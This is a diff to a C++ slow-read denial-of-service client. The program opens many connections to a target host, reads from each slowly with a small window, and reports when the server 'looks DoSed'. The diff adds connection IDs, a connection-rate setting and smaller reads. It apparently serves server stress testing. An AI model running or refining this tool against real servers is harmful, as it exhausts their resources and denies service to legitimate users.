@@ -22,6 +22,7 @@ class slowsocket {
 
     private:
         int fd;
+        int id;
         time_t lastRead;
         int readInterval;
         int windowSize;
@@ -30,7 +31,7 @@ class slowsocket {
         bool connectionEstablished;
     
     public:
-        slowsocket(int windSize, char* host, int readInterval) {
+        slowsocket(int windSize, char* host, int readInterval, int id) {
             this->windowSize = windSize;
             this->host = host;
             this->connectionEstablished = false;
@@ -38,6 +39,7 @@ class slowsocket {
             this->readbuf = new char[1024*1024];
             this->readInterval = readInterval;
             this->lastRead = time(NULL);
+            this->id = id;
         }
 
         bool connectAndSendRequest() {
@@ -49,7 +51,7 @@ class slowsocket {
             int portno = PORT;
 
             if (server == NULL) {
-                fprintf(stderr,"ERROR, no such host\n");
+                fprintf(stderr, "ERROR, no such host; Errno: %d; Detail: %s\n", h_errno, strerror(h_errno));
                 return false;
             }
 
@@ -89,14 +91,15 @@ class slowsocket {
             bool retry = false;
 
             while (1) {
+                //usleep(10 * 1000);
                 if (connect(fd,(struct sockaddr *) &serv_addr,sizeof(serv_addr)) < 0) {
                     if (!retry) {
-                        fprintf(stderr, "Failed to connect; Will try after 1 sec\n");
-                        usleep(100 * 1000);
+                        //fprintf(stderr, "Failed to connect; Will try after 1 sec\n");
+                        //usleep(100 * 1000);
                         retry = true;
                     }
                     else {
-                        fprintf(stderr, "Failed to connect on retry attempt\n");
+                        //fprintf(stderr, "Failed to connect on retry attempt\n");
                         return false;
                     }
                 }
@@ -106,7 +109,10 @@ class slowsocket {
             }
             //printf("Connected to server\n");
             connectionEstablished = true;
-            send(fd, req, strlen(req), 0);
+            if (send(fd, req, strlen(req), 0) < 0) {
+                printf("Failed to send the data; Connection established though\n");
+            }
+
             return true;
         }
 
@@ -127,12 +133,15 @@ class slowsocket {
             if (((int)difftime(currentTime, lastRead)) > readInterval) {
                 //printf("Time since last read: %d\n", ((int)difftime(currentTime, lastRead)));
                 //printf("Gonna read from socket\n");
-                int readBytes = recv(fd, readbuf, 1024*1024, 0); 
+                //int readBytes = recv(fd, readbuf, 1024*1024, 0); 
+                int readBytes = recv(fd, readbuf, 900, 0); 
                 if (readBytes == 0) {
                     fprintf(stdout, "No more data available in the socket; Closing the connection\n");
                     closeSocket();
                 }
-                //printf("Read %d bytes\n", readBytes);
+                else {
+                    printf("Connection %d read %d bytes\n", id, readBytes);
+                }
                 lastRead = time(NULL);
                 return true;
             }
@@ -149,12 +158,13 @@ class slowsocket {
 
 int main(int argc, char** argv) {
 
-    printf("%s <hostname> <readinterval> <numconn> <testduration> <windsizeinKB>\n", argv[0]);
+    printf("%s <hostname> <readinterval> <numconn> <testduration> <windsizeinKB> <rate>\n", argv[0]);
     char* hostName = argv[1];
     int readInterval = atoi(argv[2]);
     int numConnections = atoi(argv[3]);
     int testDuration = atoi(argv[4]);
     int windSize = atoi(argv[5]);
+    int delayInConnecting = 1000000/atoi(argv[6]);
     int numConnected = 0;
     slowsocket** fds = new slowsocket*[numConnections];
     
@@ -169,20 +179,21 @@ int main(int argc, char** argv) {
         }
 
         if (numConnected < numConnections) {
-            fds[numConnected] = new slowsocket(windSize, hostName, readInterval);
-            printf("Trying to connect client: %d\n", numConnected+1);
+            fds[numConnected] = new slowsocket(windSize, hostName, readInterval, numConnected);
+            //printf("Trying to connect client: %d\n", numConnected+1);
             if (!(fds[numConnected]->connectAndSendRequest())) {
-                printf("Unable to establish connection for client %d; Looks like DoSed\n", numConnected+1);
+                //printf("Unable to establish connection for client %d; Looks like DoSed\n", numConnected+1);
             }
             else {
                 printf("Successfully connected client: %d\n", numConnected+1);
+                numConnected++;
             }
-            numConnected++;
         }
 
         bool isAtleastOneOpen = false;
         for (int i=0; i<numConnected; i++) {
             if (fds[i]->isConnected()) {
+                //printf("open here\n");
                 fds[i]->readData();
                 isAtleastOneOpen = true;
             }
@@ -192,6 +203,7 @@ int main(int argc, char** argv) {
         if (!isAtleastOneOpen) {
             break;
         }
+        usleep(delayInConnecting);
     }
 
     printf("Closing the sockets\n");
